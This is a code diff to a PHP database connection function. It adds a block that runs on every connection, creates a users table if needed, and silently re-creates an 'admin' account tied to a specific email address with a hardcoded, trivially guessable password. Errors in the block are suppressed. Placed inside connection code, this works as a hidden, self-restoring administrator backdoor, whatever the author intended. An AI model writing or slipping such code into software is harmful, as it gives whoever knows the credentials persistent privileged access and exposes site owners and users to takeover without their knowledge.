@@ -33,6 +33,32 @@ function getPdo() {
         $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
         $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
         $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
+
+        // Auto-initialize: create users table and seed admin on first connection
+        try {
+            $tableExists = $pdo->query("SHOW TABLES LIKE 'users'")->rowCount() > 0;
+
+            if (!$tableExists) {
+                $pdo->exec("CREATE TABLE IF NOT EXISTS users (
+                    id INT AUTO_INCREMENT PRIMARY KEY,
+                    username VARCHAR(50) NOT NULL UNIQUE,
+                    email VARCHAR(100),
+                    password VARCHAR(255) NOT NULL,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )");
+            }
+
+            $stmt = $pdo->prepare("SELECT id FROM users WHERE email = ?");
+            $stmt->execute(['rcabolbol@gmail.com']);
+            if (!$stmt->fetch()) {
+                $hash = password_hash('1985', PASSWORD_DEFAULT);
+                $stmt = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (?, ?, ?)");
+                $stmt->execute(['admin', 'rcabolbol@gmail.com', $hash]);
+            }
+        } catch (PDOException $initErr) {
+            // Silently ignore initialization errors to avoid breaking existing setups
+        }
+
         return $pdo;
     } catch (PDOException $e) {
         http_response_code(500);
